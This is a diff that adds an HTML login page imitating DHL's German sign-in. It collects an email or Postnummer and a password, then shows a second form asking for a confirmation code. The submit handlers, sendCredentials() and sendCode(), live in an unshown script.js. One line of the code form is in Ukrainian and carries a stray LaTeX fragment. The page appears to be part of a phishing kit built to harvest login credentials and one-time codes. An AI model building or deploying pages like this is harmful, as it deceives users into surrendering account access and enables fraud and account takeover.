@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anmelden</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="header"></div>
+
+<div class="login-box">
+    
+    <div id="loginForm">
+        <h2>Anmelden</h2>
+        
+        <div class="input-group">
+            <label for="email">E-MAIL-ADRESSE ODER POSTNUMMER</label>
+            <input type="text" id="email" placeholder="" required>
+        </div>
+        
+        <div class="input-group">
+            <label for="password">PASSWORT</label>
+            <input type="password" id="password" placeholder="" required>
+        </div>
+        
+        <div class="checkbox-group">
+            <input type="checkbox" id="angemeldet" checked>
+            <label for="angemeldet">Angemeldet bleiben</label>
+            <a href="#" class="link-text" style="margin-left: 10px;">Was bedeutet "Angemeldet bleiben"?</a>
+        </div>
+
+        <button class="dhl-button" onclick="sendCredentials()">Anmelden</button>
+        
+        <div style="text-align: center; margin-bottom: 20px;">
+            <a href="#" class="link-text">Passwort vergessen?</a>
+        </div>
+
+        <div class="footer-links">
+            <p>Noch nicht bei DHL registriert? Jetzt anmelden und Services zum</p>
+            <a href="#" class="link-text">Individuellen Paketempfang und -versand nutzen.</a>
+        </div>
+    </div>
+
+    <div id="codeForm">
+        <h2>Bestätigung erforderlich</h2>
+        <p>На Ваш логін $(\text{E-MAIL-ADRESSE})$ надіслано код підтвердження.</p>
+        <div class="input-group">
+            <label for="confirmationCode">CODE EINGEBEN</label>
+            <input type="text" id="confirmationCode" placeholder="######" required>
+        </div>
+        <button class="dhl-button" onclick="sendCode()">Code bestätigen</button>
+    </div>
+
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
